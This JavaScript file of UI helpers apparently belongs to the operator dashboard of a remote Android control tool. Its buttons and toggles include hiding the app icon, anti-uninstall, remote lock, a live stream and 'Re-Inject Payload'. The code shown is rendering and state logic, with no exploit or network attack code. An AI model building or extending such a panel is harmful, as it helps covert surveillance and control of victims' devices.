function safeParseJSON(str, fallback = {}) {
    if (!str) return fallback;
    if (typeof str === "object") return str;
    try {
        return JSON.parse(str);
    } catch (e) {
        return fallback;
    }
}

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#39;");
}

function uid(prefix = "id") {
    return `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
}

function setHtmlIfChanged(node, html) {
    if (!node) return false;
    const cleanHtml = html.trim();
    if (node.__renderedHtml === cleanHtml) return false;

    // Surgical Update for grids to prevent flickering of unchanged items
    const isGrid = node.classList.contains('action-grid') || node.classList.contains('device-grid') || node.id?.includes('Grid');
    if (isGrid && node.children.length > 0) {
        const temp = document.createElement('div');
        temp.innerHTML = cleanHtml;
        const newItems = Array.from(temp.children);

        // Optimization: If child count is different, do a full replace
        if (newItems.length === node.children.length) {
            let anyChange = false;
            newItems.forEach((newItem, i) => {
                const oldItem = node.children[i];
                // Strip transient and state-driven classes for stable comparison of the button's core identity
                const strip = (h) => h.replace(/\s?is-pressed/g, '')
                                     .replace(/\s?is-loading/g, '')
                                     .replace(/\s?is-toggled/g, '')
                                     .replace(/\s?is-disabled/g, '')
                                     .replace(/lucide-processed="true"/g, '');

                const oldClean = strip(oldItem.outerHTML);
                const newClean = strip(newItem.outerHTML);

                if (oldClean !== newClean) {
                    // Update only this specific element
                    const preservedClasses = [];
                    if (oldItem.classList.contains('is-pressed')) preservedClasses.push('is-pressed');

                    oldItem.replaceWith(newItem.cloneNode(true));
                    const freshlyAdded = node.children[i];
                    preservedClasses.forEach(c => freshlyAdded.classList.add(c));
                    anyChange = true;
                } else {
                    // Even if the "clean" HTML is the same, transient classes might have changed.
                    // Sync the classes that are driven by state.
                    const isLoading = newItem.classList.contains('is-loading');
                    const isToggled = newItem.classList.contains('is-toggled');
                    const isDisabled = newItem.classList.contains('is-disabled');

                    if (oldItem.classList.contains('is-loading') !== isLoading) {
                        oldItem.classList.toggle('is-loading', isLoading);
                        anyChange = true;
                    }
                    if (oldItem.classList.contains('is-toggled') !== isToggled) {
                        oldItem.classList.toggle('is-toggled', isToggled);
                        anyChange = true;
                    }
                    if (oldItem.classList.contains('is-disabled') !== isDisabled) {
                        oldItem.classList.toggle('is-disabled', isDisabled);
                        anyChange = true;
                    }
                }
            });
            node.__renderedHtml = cleanHtml;
            if (anyChange && cleanHtml.includes("data-lucide")) dom.iconsDirty = true;
            return anyChange;
        }
    }

    if (cleanHtml.includes("data-lucide")) {
        dom.iconsDirty = true;
    }

    node.innerHTML = cleanHtml;
    node.__renderedHtml = cleanHtml;
    return true;
}

function getModalSignature(modal) {
    if (!modal) return "";
    // Jika modal adalah stream, tambahkan status stream ke signature agar UI terupdate saat koneksi berhasil
    if (modal.type === "stream") {
        return JSON.stringify(modal) + state.stream.status;
    }
    return JSON.stringify(modal);
}

function formatLogTime(value = new Date()) {
    return new Intl.DateTimeFormat("en-GB", {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
    }).format(value);
}

function isOnline(device) {
    if (!device?.last_seen) return false;
    try {
        const lastSeen = new Date(device.last_seen).getTime();
        if (isNaN(lastSeen)) return false;
        return Date.now() - lastSeen < 35000;
    } catch (e) {
        return false;
    }
}

function ago(value) {
    if (!value) return "--";
    try {
        const timestamp = new Date(value).getTime();
        if (isNaN(timestamp)) return "--";
        const diff = Math.max(0, Math.floor((Date.now() - timestamp) / 1000));
        if (diff < 60) return `${diff}s`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h`;
        return `${Math.floor(diff / 86400)}d`;
    } catch (e) {
        return "--";
    }
}

function selectedDeviceReady() {
    return Boolean(state.data.selectedDeviceId && state.data.selectedDevice);
}

function getSelectedDeviceControlStates() {
    const deviceId = state.data.selectedDeviceId;
    if (!deviceId) return {};
    return state.data.controlStatesByDevice[deviceId] || {};
}

function getToggleConfig(toggleKey) {
    return TOGGLE_ACTIONS[toggleKey] || null;
}

function isToggleActive(toggleKey) {
    const toggle = getToggleConfig(toggleKey);
    if (!toggle) return false;

    const controlStates = getSelectedDeviceControlStates();
    if (controlStates[toggle.stateKey] !== undefined) {
        return controlStates[toggle.stateKey];
    }

    const device = state.data.selectedDevice;
    if (device && device.status) {
        const s = safeParseJSON(device.status);
        if (toggleKey === 'lock' && (s.is_locked !== undefined || s.locked !== undefined)) {
            return s.is_locked ?? s.locked;
        }
        if (toggleKey === 'flashlight' && (s.flashlight_on !== undefined || s.flashlightOn !== undefined)) {
            return s.flashlight_on ?? s.flashlightOn;
        }
        if (toggleKey === 'hideIcon' && (s.icon_hidden !== undefined || s.iconHidden !== undefined)) {
            return s.icon_hidden ?? s.iconHidden;
        }
        if (toggleKey === 'antiUninstall' && (s.anti_uninstall !== undefined || s.antiUninstall !== undefined)) {
            return s.anti_uninstall ?? s.antiUninstall;
        }
    }

    return toggle.defaultValue;
}

function resolveToggleAction(toggleKey) {
    const toggle = getToggleConfig(toggleKey);
    if (!toggle) return null;
    const active = isToggleActive(toggleKey);
    const mode = active ? toggle.on : toggle.off;

    return {
        key: toggleKey,
        type: "toggle-command",
        icon: mode.icon,
        label: mode.label,
        command: mode.command,
        isActive: active
    };
}

let _renderTimeout = null;
function setState(patch) {
    let changed = false;
    if (patch.auth) { state.auth = { ...state.auth, ...patch.auth }; changed = true; }
    if (patch.ui) { state.ui = { ...state.ui, ...patch.ui }; changed = true; }
    if (patch.data) { state.data = { ...state.data, ...patch.data }; changed = true; }
    if (patch.stream) { state.stream = { ...state.stream, ...patch.stream }; changed = true; }

    if (changed) {
        if (_renderTimeout) cancelAnimationFrame(_renderTimeout);
        _renderTimeout = requestAnimationFrame(() => {
            UI.render();
            _renderTimeout = null;
        });
    }
}

function addLogEntry(message, kind = "normal") {
    const entry = {
        id: uid("log"),
        message,
        kind,
        time: formatLogTime()
    };

    setState({
        ui: {
            logs: [...state.ui.logs.slice(-119), entry]
        }
    });
}

function showLoader(show) {
    dom.loader.classList.toggle("hidden", !show);
}

function addToast(text, kind = "ok") {
    const toast = { id: uid("toast"), text: String(text).slice(0, 200), kind };

    // Cara Timpa: Memaksa hanya ada 1 notifikasi yang muncul (menggantikan yang lama)
    setState({ ui: { toasts: [toast] } });

    setTimeout(() => {
        const el = document.querySelector(`[data-toast-id="${toast.id}"]`);
        if (el) el.classList.add('fade-out');

        setTimeout(() => {
            // Hanya hapus jika toast ini masih yang aktif di state
            if (state.ui.toasts.length > 0 && state.ui.toasts[0].id === toast.id) {
                setState({ ui: { toasts: [] } });
            }
        }, 400);
    }, 3000);
}

function removeToast(toastId) {
    if (!state.ui.toasts.some((item) => item.id === toastId)) return;
    setState({ ui: { toasts: state.ui.toasts.filter((item) => item.id !== toastId) } });
}

function closeModal() {
    if (!state.ui.modal) return;
    setState({ ui: { modal: null } });
}

async function safeQuery(label, task, options = {}) {
    const timeoutMs = options.timeout || 12000;
    try {
        const result = await Promise.race([
            task(),
            new Promise((_, reject) => setTimeout(() => reject(new Error("Request timeout")), timeoutMs))
        ]);
        if (result?.error) throw result.error;
        return result;
    } catch (error) {
        console.error(label, error);
        const msg = error.message || `${label} failed`;
        if (!options.silent) addToast(msg, "error");
        return { success: false, error: msg };
    }
}

function renderIcon(name, className = "", style = "") {
    try {
        if (window.lucide && lucide.icons) {
            const iconName = name.split('-').map(part => part.charAt(0).toUpperCase() + part.slice(1)).join('');
            if (lucide.icons[iconName]) {
                return lucide.icons[iconName].toSvg({
                    class: `lucide-icon ${className}`,
                    style: style
                });
            }
        }
    } catch (e) {}
    return `<i data-lucide="${name}" class="${className}" style="${style}"></i>`;
}

function buildActionButton(action) {
    if (action.vipOnly && state.auth.role === "user" && !state.auth.isAdmin) {
        return "";
    }

    const finalAction = action.type === "toggle-command"
        ? resolveToggleAction(action.key)
        : action;
    if (!finalAction) return "";

    const active = action.type === "toggle-command" ? isToggleActive(action.key) : false;
    const valueStr = escapeHtml(finalAction.value || "");
    const actionStr = finalAction.type;
    const isBtnLoading = state.ui.loadingButtons.has(`${actionStr}:${valueStr}`);

    let finalLabel = finalAction.label;
    if (finalAction.value === CMD.UPDATE_PAYLOAD) {
        const d = state.data.selectedDevice;
        const s = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
        if (s.payload_active) finalLabel = "Re-Inject Payload";
    }

    let statusBadge = "";
    if (action.permKey) {
        const device = state.data.selectedDevice;
        const status = device ? safeParseJSON(device.status) : {};
        let isGranted = action.permKey === "permissions_granted" ? status.permissions_granted : status.permissions?.[action.permKey];

        statusBadge = `<div class="perm-status-pill ${isGranted ? "is-granted" : "is-denied"}">
            ${isGranted ? "Granted" : "Denied"}
        </div>`;
    }

    // DIRECT SVG INJECTION TO PREVENT FLICKER
    let iconHtml = renderIcon(finalAction.icon, "lucide-icon");

    return `
        <button
            type="button"
            class="action-btn ${active ? "is-toggled" : ""} ${isBtnLoading ? "is-loading" : ""}"
            data-action="${actionStr}"
            data-value="${valueStr}"
            ${finalAction.key ? `data-toggle-key="${escapeHtml(finalAction.key)}"` : ""}
            ${finalAction.command ? `data-command="${escapeHtml(finalAction.command)}"` : ""}
            title="${escapeHtml(finalLabel)}"
        >
            ${iconHtml}
            <span>${escapeHtml(finalLabel)}</span>
            ${statusBadge}
        </button>
    `;
}

